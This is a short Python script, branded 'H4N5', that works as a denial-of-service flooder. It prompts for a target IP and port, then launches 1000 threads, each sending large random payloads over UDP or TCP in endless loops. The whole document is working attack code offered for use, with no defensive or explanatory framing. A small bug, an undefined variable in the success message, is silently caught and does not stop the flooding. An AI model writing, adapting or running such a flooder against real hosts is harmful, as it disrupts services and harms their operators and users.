import random
import socket
import threading
import os , sys

print("#-- H4N5 --#")
ip = str(input(" IP SERVER :"))
port = int(input(" Port :"))
choice = str(input(" UDP(y/n) :"))
os.system("clear")
def udp():
	data = random._urandom(20000)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(1000):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[H4N5] Sent!!! %s Port %s"%(ip,port))

def tcp():
	data = random._urandom(696969)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(1000):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(1000):
	if choice == 'y':
		th = threading.Thread(target = udp)
		th.start()
	else:
		th = threading.Thread(target = tcp)
		th.start()